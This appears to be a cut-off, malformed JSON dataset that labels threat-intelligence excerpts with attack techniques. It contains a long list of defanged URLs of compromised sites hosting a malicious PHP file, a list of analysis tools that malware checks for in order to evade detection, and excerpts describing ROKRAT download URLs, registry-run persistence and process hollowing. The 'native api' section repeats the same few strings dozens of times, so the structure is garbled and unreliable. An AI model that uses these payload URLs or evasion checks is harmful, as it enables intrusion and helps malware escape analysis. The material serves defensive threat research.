hxxp://amesoulcoaching[.]com//db_template.php hxxp://www.antigonisworld[.]com/wp-includes/db_template.php hxxps://anbinni.ba/wp-admin/db_template.php hxxp://arctistrade[.]de/wp/db_template.php hxxp://aianalytics[.]ie//db_template.php hxxp://www.gilforsenate[.]com//db_template.php hxxp://mgamule[.]co.za/oldweb/db_template.php hxxp://chrisdejager-attorneys[.]co.za//db_template.php hxxp://alfredocifuentes[.]com//db_template.php hxxp://alxcorp[.]com//db_template.php hxxps://www.aircafe24[.]com//db_template.php hxxp://agencereferencement.be/wp-admin/db_template.php hxxp://americanlegacies[.]org/webthed_ftw/db_template.php hxxps://aloefly[.]net//db_template.php hxxp://www.duotonedigital[.]co.za//db_template.php hxxp://architectsinc[.]net//db_template.php hxxp://www.tanati[.]co.za//db_template.php hxxp://emware[.]co.za//db_template.php hxxp://breastfeedingbra[.]co.za//db_template.php hxxp://alhidayahfoundation[.]co[.]uk/category/db_template.php hxxp://cashforyousa[.]co.za//db_template.php hxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.php hxxp://antjetaubert[.]de//db_template.php hxxp://hesterwebber[.]co.za//db_template.php hxxp://fickstarelectrical[.]co.za//db_template.php hxxp://alex-frost[.]com/assets/db_template.php hxxps://americanbrasil[.]com.br//db_template.php hxxps://aileeshop[.]com//db_template.php hxxps://annodle[.]com//db_template.php hxxp://goldeninstitute[.]co.za/contents/db_template.php hxxp://ednpk[.]com//db_template.php hxxp://www.arabiccasinochoice[.]com//db_template.php hxxp://proeventsports[.]co.za//db_template.php hxxp://glenbridge[.]co.za//db_template.php hxxp://berped[.]co.za//db_template.php hxxp://best-digital-slr-cameras[.]com//db_template.php hxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.php hxxp://www.alpacal[.]com//db_template.php hxxps://www.alakml[.]com/wp-admin/db_template.php hxxp://ar-rihla[.]com//db_template.php hxxp://appsvoice[.]info//db_template.php hxxp://www.bashancorp[.]co.za//db_template.php hxxp://alexanderbecker[.]net/services/db_template.php hxxp://visionclinic.co.ls/visionclinic/db_template.php hxxps://www.angelesrevista[.]com//db_template.php hxxps://www.antojoentucocina[.]com//db_template.php hxxp://apollonweb[.]com//db_template.php hxxps://www.alphapixa[.]com//db_template.php hxxp://capitalradiopetition[.]co.za//db_template.php hxxp://www.generictoners[.]co.za//db_template.php hxxps://alnahdatraining[.]com//db_template.php hxxps://albousala[.]com//db_template.php hxxps://www.dopetroleum[.]com//db_template.php hxxp://bios-chip[.]co.za//db_template.php hxxp://www.crissamconsulting[.]co.za//db_template.php hxxp://capriflower[.]co.za//db_template.php hxxp://www.dingaanassociates[.]co.za//db_template.php hxxp://indiba-africa[.]co.za//db_template.php hxxp://verifiedseller[.]co.za/js/db_template.php hxxps://www.buraqlubricant[.]com//db_template.php hxxp://aqarco[.]com/wp-admin/db_template.php hxxp://allaboutblockchain[.]net//db_template.php hxxp://www.amexcars[.]info/tpl/db_template.php hxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.php hxxp://bakron[.]co.za//db_template.php hxxp://gsnconsulting[.]co.za//db_template.php hxxp://vumavaluations[.]co.za//db_template.php hxxp://heritagetravelmw[.]com//db_template.php hxxp://ampvita[.]com//db_template.php hxxp://ahero-resource-center[.]org/administrator/db_template.php hxxps://arbulario[.]com//db_template.php hxxp://havilahglo[.]co.za/wpscripts/db_template.php hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php hxxp://delectronics[.]com[.]pk//db_template.php hxxp://antucomp[.]com//db_template.php hxxp://advocatetn[.]com/font-awesome/fonts/db_template.php hxxps://amooy[.]com/webservice/db_template.php hxxp://www.harmonyguesthouse[.]co.za//db_template.php hxxp://alanrori[.]com//db_template.php hxxp://algarvesup[.]com//db_template.php hxxp://desirablehair[.]co.za//db_template.php hxxp://comsip[.]org.mw//db_template.php hxxp://jdcorporate[.]co.za/catalog/db_template.php hxxp://andrewfinnburhoe[.]com//db_template.php hxxp://anyeva[.]com/wp-includes/db_template.php hxxp://www.agenceuhd[.]com//db_template.php hxxp://host4unix[.]net/host24new/db_template.php hxxp://www.altaica[.]ca/wordpress/db_template.php hxxp://www.allbuyer[.]co[.]uk//db_template.php hxxp://jvpsfunerals[.]co.za//db_template.php hxxp://immaculatepainters[.]co.za//db_template.php hxxp://tcpbereka[.]co.za/js/db_template.php hxxp://clientcare.co.ls//db_template.php hxxp://investaholdings[.]co.za/htc/db_template.php hxxp://www.amjobs[.]co[.]uk//db_template.php hxxp://www.agirlgonewine[.]com/store/db_template.php hxxp://findinfo-more[.]com//db_template.php hxxp://asgen[.]org//db_template.php hxxp://alphasalesrecruitment[.]com//db_template.php hxxp://irshadfoundation[.]co.za//db_template.php hxxp://analternatif[.]com/includes/db_template.php hxxp://arbruisseau[.]com/profiles/db_template.php hxxp://ladiescircle[.]co.za//db_template.php hxxp://all-reseller[.]com/zzz_backup/db_template.php hxxp://alcatrazmoon[.]com/images/db_template.php hxxp://www.alcalumni[.]com/wp-includes/db_template.php hxxp://aniljoseph[.]com/servermon/db_template.php hxxp://alwake3press[.]com/wp-includes/db_template.php hxxp://www.hfhl[.]org.ls/habitat/db_template.php hxxp://alcafricanos[.]com/slsmonographs/db_template.php hxxps://agapeencounter[.]org//db_template.php hxxp://apobiomedix[.]ca//db_template.php hxxp://anythinglah[.]info//db_template.php hxxp://aniroleplay[.]net//db_template.php hxxp://www.allcopytoners[.]com//db_template.php hxxp://alphaobring[.]com//db_template.php hxxp://www.galwayprimary[.]co.za//db_template.php hxxp://alnuzha[.]org/en/db_template.php hxxps://ancient-wisdoms[.]com//db_template.php hxxp://amazingenergysavings[.]net//db_template.php hxxp://gvs[.]com[.]pk/font-awesome/db_template.php hxxp://geetransfers[.]co.za/font-awesome/db_template.php hxxp://carlagrobler[.]co.za/components/db_template.php hxxp://amazingashwini[.]com//db_template.php hxxp://aminearserver[.]es//db_template.php hxxp://lensofafrica[.]co.za//db_template.php hxxp://greenacrestf[.]co.za/video/db_template.php hxxp://www.tonaro[.]co.za//db_template.php hxxp://alephit2[.]biz/kitzz/db_template.php hxxp://lppaportal[.]org.ls//db_template.php hxxp://alkousy[.]com//db_template.php hxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.php hxxp://fragranceoil[.]co.za//db_template.php hxxp://www.eloquent[.]co.za/nweb2/db_template.php hxxp://chrishanicdc[.]org/wpimages/db_template.php hxxp://ahc.me[.]uk//db_template.php hxxp://www.britishasia-equip[.]co[.]uk//db_template.php hxxp://always-beauty[.]ch//db_template.php hxxps://www.ancamamara[.]com/wp-admin/db_template.php hxxp://entracorntrading[.]co.za//db_template.php hxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.php hxxp://americabr[.]com.br//db_template.php hxxp://andrew-snyder[.]net/bootstrap/db_template.php hxxp://signsoftime[.]co.za//db_template.php hxxp://aperta-armis[.]org//db_template.php hxxp://absfinancialplanning[.]co.za/images/db_template.php hxxp://charispaarl[.]co.za//db_template.php hxxp://indlovusecurity[.]co.za//db_template.php hxxp://alcafricandatalab[.]com//db_template.php hxxp://amor-clubhotels[.]com//db_template.php hxxp://mokorotlocorporate[.]com//db_template.php hxxp://apppriori[.]com//db_template.php hxxp://luxconprojects[.]co.za//db_template.php hxxp://androidphonetips[.]com/wp-includes/db_template.php hxxp://angel-seeds[.]com.ua/catalog/db_template.php hxxp://alissanicolai[.]com/assets/db_template.php hxxps://www.amateurastronomy[.]org//db_template.php hxxp://aiofotoevideo[.]com//db_template.php hxxp://www.amika.hr//db_template.php hxxp://comfortex[.]co.za/php/db_template.php hxxp://deepgraphics[.]co.za//db_template.php hxxps://agiledepot[.]com//db_template.php hxxp://almatours[.]gr//db_template.php hxxp://analystcnwang[.]com//db_template.php hxxp://www.malboer[.]co.za/trendy1/db_template.php hxxp://sefikengfarm.co.ls//db_template.php hxxp://www.antirughenaturale[.]com/wp-admin/db_template.php hxxp://passright[.]co.za//db_template.php hxxp://seismicfactory[.]co.za//db_template.php hxxp://alessandroalessandrini[.]it//db_template.php hxxps://aquabsafe[.]com//db_template.php hxxp://amatikulutours[.]com/tmp/db_template.php hxxp://ganitis[.]gr//db_template.php hxxp://aleenasgiftbox[.]com/admin/db_template.php hxxps://allusdoctors[.]com/themes/db_template.php hxxp://alainsaffel[.]com//db_template.php hxxp://www.ariehandomri[.]com//db_template.php hxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.php hxxp://itengineering[.]co.za/gatewaydiamond/db_template.php hxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.php hxxp://www.albertamechanical[.]ca//db_template.php hxxp://alchamel[.]info//db_template.php hxxps://almokan[.]net/wp-includes/db_template.php hxxp://jakobieducation[.]co.za//db_template.php hxxps://arc-sec[.]net//db_template.php hxxp://ldams[.]org.ls/supplies/db_template.php hxxp://menaboracks[.]co.za/tmp/db_template.php hxxp://www.getcord[.]co.za//db_template.php hxxp://boardaffairs[.]com//db_template.php hxxp://capetownway[.]co.za//db_template.php hxxp://cloudhostdesign[.]com//db_template.php hxxp://hartenboswaterpark[.]co.za/templates/db_template.php hxxp://fccorp[.]co.za/php/db_template.php hxxp://angar68[.]com//db_template.php hxxp://www.dws-gov[.]co.za//db_template.php hxxp://alwahahweb[.]com//db_template.php hxxp://anuragcreatives[.]com//db_template.php hxxp://embali[.]co.za//db_template.php hxxp://albertaedmonton[.]com/widgetstyles/db_template.php hxxp://altosdefontana[.]com//db_template.php hxxp://airfanhydro[.]net//db_template.php hxxps://www.alexponcet[.]com/wp-includes/db_template.php hxxp://agropecuariavilarica[.]com.br//db_template.php hxxps://www.amazingbuyrd[.]com/admin/db_template.php hxxp://cdxtrading[.]co.za//db_template.php hxxp://interafricaconsulting[.]com/wpimages/db_template.php hxxp://glgroup[.]co.za/images/db_template.php hxxp://hisandherskennels[.]co.za/php/db_template.php hxxp://alemaohost[.]com/lotosorg[.]com/db_template.php hxxp://isibaniedu[.]co.za/admin/db_template.php hxxp://dianakleyn[.]co.za/layouts/db_template.php hxxp://themotoringcalendar[.]co.za//db_template.php hxxp://www.loansonhomes[.]co.za//db_template.php hxxp://edgesecurity[.]co.za/js/db_template.php hxxp://highschoolsuperstar[.]co.za/files/db_template.php hxxp://www.ambientproperty[.]com//db_template.php hxxp://animationshowreel[.]co.il//db_template.php hxxp://cafawelding[.]co.za/font-awesome/db_template.php hxxp://apalawyers.pt//db_template.php hxxp://www.edesignz[.]co.za//db_template.php hxxp://centuryacademy[.]co.za/css/db_template.php hxxps://ambyenta.hr//db_template.php hxxp://ceramica[.]co.za//db_template.php hxxp://www.alfredoposada[.]com//db_template.php hxxp://anastasovsworkshop[.]com/wp-includes/db_template.php hxxp://allisonplumbing[.]com/wp-includes/db_template.php hxxp://eastrandmotorlab[.]co.za/fleet/db_template.php hxxp://angelsongroup[.]com/wp-includes/db_template.php hxxp://www.mikimaths[.]com//db_template.php hxxp://hjb-racing[.]co.za/htdocs/db_template.php hxxp://anotherpartofme[.]com/wp-includes/db_template.php hxxp://www.andreabelfi[.]com//db_template.php hxxp://www.iancullen[.]co.za//db_template.php hxxp://alaskamaterials[.]com//db_template.php hxxp://jeanetteproperties[.]co.za//db_template.php hxxp://www.digitalmedia[.]co.za//db_template.php hxxp://www.rejoicetheatre[.]com//db_template.php hxxps://alterwebhost[.]com//db_template.php hxxp://bc-u[.]co[.]uk//db_template.php hxxp://dpscdgkhan.edu[.]pk/shopping/db_template.php hxxp://edgeforensic[.]co.za//db_template.php hxxp://willpowerpos[.]co.za//db_template.php hxxp://antrismode[.]com/wp-includes/db_template.php hxxp://colenesphotography[.]co.za/modules/db_template.php hxxp://anthaigroup.vn//db_template.php hxxps://alphainvestors[.]com.au//db_template.php hxxps://aliart[.]nl//db_template.php hxxps://allmantravel[.]com/thumbs/db_template.php hxxp://fbrvolume[.]co.za//db_template.php hxxp://amordegato[.]es/storefront/db_template.php hxxp://agylub[.]com//db_template.php hxxp://www.khotsonglodge.co.ls//db_template.php hxxp://ampli5yd[.]com//db_template.php hxxps://animeok[.]co.il//db_template.php hxxps://arbeidsrechtcentrum[.]nl//db_template.php hxxp://erniecommunications[.]co.za/js/db_template.php hxxp://promechtransport[.]co.za/scripts/db_template.php hxxp://centuriongsd[.]co.za//db_template.php hxxp://www.agencesylvieleclerc[.]com//db_template.php hxxp://delcom[.]co.za//db_template.php hxxps://aleoestudio[.]com/gallonature/db_template.php hxxp://oftheearthphotography[.]com/www/db_template.php hxxp://h-dubepromotions[.]co.za//db_template.php hxxp://www.alessioborzuola[.]com/downloads/db_template.php hxxp://crystaltidings[.]co.za//db_template.php hxxp://funeralbusinesssolution[.]com/email_template/db_template.php hxxp://funisalodge[.]co.za/data1/db_template.php hxxp://experttutors[.]co.za//db_template.php hxxps://www[.]cartridgecave[.]co.za//db_template.php hxxp://ecs-consult[.]com//db_template.php hxxp://www.animationinisrael[.]org/tmp_images/db_template.php hxxp://gideonitesprojects[.]com//db_template.php hxxp://hybridauto[.]co.za/photography/db_template.php hxxp://africanpixels.zar.cc//db_template.php hxxp://ryanchristiefurniture[.]co.za//db_template.php hxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.php hxxp://almeriahotelja[.]com/dk/db_template.php hxxp://al3abflash[.]biz//db_template.php hxxp://www.fun4kidz[.]co.za//db_template.php hxxp://alsharhanstore[.]com//db_template.php hxxp://www[.]infratechconsulting[.]com//db_template.php hxxp://algihad[.]com/assets/db_template.php hxxp://americanwestmedia[.]com//db_template.php hxxp://charliewestsecurity[.]co.za//db_template.php hxxp://beehiveholdingszar[.]co.za//db_template.php hxxp://analyticalfootball[.]com//db_template.php hxxp://apiiination[.]com/leadership/db_template.php hxxps://ahelicoptermom[.]com/wp-includes/db_template.php hxxp://servicebox[.]co.za//db_template.php hxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.php hxxps://aquo[.]in//db_template.php hxxps://www.alfransia[.]com/wp-admin/db_template.php hxxp://www.icsswaziland[.]com//db_template.php hxxp://aiko.pro//db_template.php hxxps://alceharfield[.]com//db_template.php hxxp://indocraft[.]co.za/test/db_template.php hxxp://allegiancesecurity[.]org//db_template.php hxxp://sullivanprimary[.]co.za//db_template.php hxxp://www.apmequestrian[.]com//db_template.php hxxps://alphawaves[.]org/wp-admin/db_template.php hxxp://www.alexandrasternin[.]com/illustration/db_template.php hxxp://www.daleth[.]co.za//db_template.php hxxp://jwseshowe[.]co.za/assets/db_template.php hxxp://winagainstebola[.]com//db_template.php hxxp://anubandh[.]in//db_template.php hxxp://www.alexanderhomestead[.]com//db_template.php hxxp://alfatek-intelligence[.]com//db_template.php hxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.php hxxp://alorabrownies[.]com/wp-admin/db_template.php hxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.php hxxp://cazochem[.]co.za/cazochem/db_template.php hxxp://debnoch[.]com/image/db_template.php hxxp://hmholdings360[.]co.za//db_template.php hxxp://iinvest4u[.]co.za//db_template.php hxxp://burgercoetzeeattorneys[.]co.za//db_template.php hxxp://anngrigphoto[.]com//db_template.php hxxp://alchemistasonida[.]com//db_template.php hxxp://anahera[.]biz/admin/db_template.php hxxp://h-u-i[.]co.za/heiren/db_template.php hxxp://insta-art[.]co.za//db_template.php hxxp://muallematsela[.]com//db_template.php hxxp://aguasdecastilla[.]com/uploads/db_template.php hxxp://www.arabgamenetwork[.]com//db_template.php hxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.php hxxp://amruthavana[.]com/blog/db_template.php hxxp://digitalblue[.]co.za//db_template.php hxxps://www.alvarezarquitectos[.]com//db_template.php hxxp://buboobioinnovations[.]co.za/wpimages/db_template.php hxxp://andrewsbisom[.]com//db_template.php hxxp://www.m-3[.]co.za//db_template.php hxxp://beesrenovations[.]co.za/images/db_template.php hxxps://www.apliety[.]co.il/wp-includes/db_template.php hxxp://alchamelup[.]org/htdocs/db_template.php hxxp://benonicoc[.]co.za/resources/db_template.php hxxps://al-mostakbl[.]com//db_template.php hxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.php hxxp://andrespazsoldan[.]com//db_template.php hxxp://in2accounting[.]co.za//db_template.php hxxp://aipa[.]ca//db_template.php hxxp://alphabee.fund/PHPMailer_5.2.0/db_template.php hxxp://arabsdeals[.]com//db_template.php hxxps://archiotronic[.]com/wp-includes/db_template.php hxxp://capewindstrading[.]co.za//db_template.php hxxps://althurayaa[.]com//db_template.php hxxp://jhphotoedits[.]co.za//db_template.php hxxp://cloudhub.co.ls/modules/db_template.php hxxp://apironco[.]com/wp-includes/db_template.php hxxp://digital-cameras-south-africa[.]co.za/script/db_template.php hxxp://ahmadhasanat[.]com//db_template.php hxxp://alexrocchi[.]com//db_template.php hxxp://aljaadi[.]com//db_template.php hxxps://www.engeltjieakademie[.]co.za//db_template.php hxxp://annabelle[.]nl/next/db_template.php hxxp://juniorad[.]co.za/vendor/db_template.php hxxp://animationpulse[.]net//db_template.php hxxp://angloglot[.]com//db_template.php hxxp://agricolavicuna.cl//db_template.php hxxp://alexelgy[.]com/allaccess/db_template.php hxxp://www.centreforgovernance[.]uk//db_template.php hxxp://www.aliandconsulting[.]com//db_template.php hxxp://balaateen[.]co.za/less/db_template.php hxxp://aleksicdunja[.]com//db_template.php hxxp://arestihome[.]com//db_template.php hxxp://am1int.fcomet[.]com/wp1/db_template.php hxxp://anet-international-group[.]com/shop/db_template.php hxxp://courtesydriving[.]co.za/js/db_template.php hxxp://annaplebanek[.]com//db_template.php hxxp://agencijazemil[.]com//db_template.php hxxp://airminumtiro[.]com//db_template.php hxxp://www.androidwikihow[.]com//db_template.php hxxp://alisabyfinna[.]com//db_template.php hxxp://rma-law[.]co.za//db_template.php hxxp://amari[.]ro/components/db_template.php hxxp://anxiousandunstoppable[.]com//db_template.php hxxp://www.buhlebayoacademy[.]com//db_template.php hxxp://arabellajo[.]com/wp/wp-includes/db_template.php hxxp://blackthorn[.]co.za//db_template.php hxxp://alaqaba[.]com/dnsarabia[.]com/db_template.php hxxp://airesis.blog/wp-admin/db_template.php hxxp://www.aptibet[.]org//db_template.php hxxp://alecattic[.]com/wp-includes/db_template.php hxxp://anglero[.]com//db_template.php hxxp://getabletravel[.]co.za/wpscripts/db_template.php hxxp://www.allwestdental[.]com/wp-includes/db_template.php hxxp://printernet[.]co.za//db_template.php hxxp://genesisbs[.]co.za//db_template.php hxxp://allsporthealthandfitness[.]com//db_template.php hxxp://www.humorcarbons[.]com//db_template.php hxxp://intelligentprotection[.]co.za//db_template.php hxxp://amazethings[.]com//db_template.php hxxp://incoso[.]co.za/images/db_template.php hxxp://www.antoanetapalikarska[.]com//db_template.php hxxps://www.alteaparadise[.]com/wp-includes/db_template.php hxxp://amirmenahem[.]com//db_template.php hxxp://isound[.]co.za//db_template.php hxxp://www.alestilorachel[.]com//db_template.php hxxp://alcfm[.]net/wp-admin/db_template.php hxxp://www.acer-parts[.]co.za//db_template.php hxxp://www.gsmmid[.]com//db_template.php hxxp://skhaleni[.]co.za//db_template.php hxxps://amiici.vision//db_template.php hxxps://andihaas[.]at/wp-includes/db_template.php hxxp://www.albertaprimebeef[.]com//db_template.php hxxps://www.appster[.]it/wp-includes/db_template.php hxxp://amofoundation[.]org/wp-includes/db_template.php hxxp://iqra[.]co.za/pub/db_template.php hxxp://thecompasssolutions[.]co.za//db_template.php hxxp://archwaycarpetscrm[.]co[.]uk//db_template.php hxxp://iggleconsulting[.]com//db_template.php hxxps://angel-blanco[.]net/wp-includes/db_template.php hxxps://anotherdayinparadise[.]ca//db_template.php hxxp://www.bitp[.]co.za//db_template.php hxxp://cupboardcure[.]co.za/vendor/db_template.php hxxp://all2wedding[.]com/wp-includes/db_template.php hxxp://allianz[.]com.pe/wp-admin/db_template.php hxxp://amiehepperlin[.]com//db_template.php hxxps://www.amighini[.]it/webservice/db_template.php hxxp://broken-arrow[.]co.za//db_template.php hxxp://www.ihlosiqs-pm[.]co.za//db_template.php hxxp://alisimple[.]si/wp-includes/db_template.php hxxp://allthat[.]social//db_template.php hxxp://www.amphibiblechurch[.]com//db_template.php hxxp://bestencouragementwords[.]com//db_template.php hxxp://alayhamtechnologies[.]com//db_template.php hxxps://alaskanharvestseafood[.]com/backup/db_template.php hxxps://www.air-mag[.]ro//db_template.php hxxp://get-paid-for-online-survey[.]com//db_template.php hxxp://www.antc[.]ch/wp-includes/db_template.php hxxp://firstchoiceproperties[.]co.za//db_template.php hxxp://habibtextiles[.]pk//db_template.php hxxp://fsproperties[.]co.za/engine1/db_template.php hxxp://diegemmerkat[.]co.za//db_template.php hxxp://molepetravel.co.ls//db_template.php hxxp://mmetl[.]co.za//db_template.php hxxp://altrablog[.]com//db_template.php hxxp://abrahamseed[.]co.za//db_template.php hxxp://www.amerindgen[.]com/author/admin1/db_template.php hxxp://altcoinaddict[.]com//db_template.php hxxp://iiee.edu[.]pk//db_template.php hxxp://cmhts[.]co.za/resources/db_template.php hxxp://domesticguardians[.]co.za/Banner/db_template.php hxxps://amishcountryfurnishings[.]com//db_template.php hxxps://allday[.]gr//db_template.php hxxp://www.alinn-u-yin[.]com//db_template.php hxxps://www.allin-chain[.]com//db_template.php hxxps://www.anatapackaging[.]com/vendors/db_template.php hxxp://alexcelts[.]com/wp/db_template.php hxxp://www.allstylus[.]com.br//db_template.php hxxp://www.algom-law[.]com//db_template.php hxxp://ambiances-toiles[.]fr//db_template.php Appendix Security Tools Checked on the Machine win32_remote win64_remote64 ollydbg ProcessHacker tcpview autoruns autorunsc filemon procmon regmon procexp idaq idaq64 ImmunityDebugger Wireshark dumpcap HookExplorer ImportREC PETools LordPE dumpcap SysInspector proc_analyzer sysAnalyzer sniff_hit windbg joeboxcontrol joeboxserver"
    ]
  },
  "virtualization/sandbox evasion remote file copy-multi": {
    "technique_names": [
      "ingress tool transfer",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "The first email displays the following decoy document to the infected user and download the following payload:hxxp://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpgThe second email displays the following decoy document to the infected user and downloads the following payload:hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpgIn both cases, the downloaded payload is the ROKRAT malware.The first tasks of this variant of ROKRAT is to check the operating system version"
    ]
  },
  "native api": [
    "The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded",
    "In this context the main function is executed.\"Console\": with the argument, a persistence is configured and the malware will be executed at the next reboot ( HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runsample ).\"Sample\": with this argument, the malware executes the console command followed by the help command.The information collected is performed using WMI queries:Additionally the malware lists the running process via the Microsoft Windows API",
    "The overwritten instruction (displayed in Figure 1) is used to call the \u201cWinExec\u201d function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the \u201cWinExec\u201d function",
    "The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer",
    "FInally , the newest sample uses dynamic API lookups to attempt to make static disassembly harder to understand.",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    "Windows API calls ",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    " Win32 API",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    "CreateProcess ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadLibrary ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " LoadModule() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
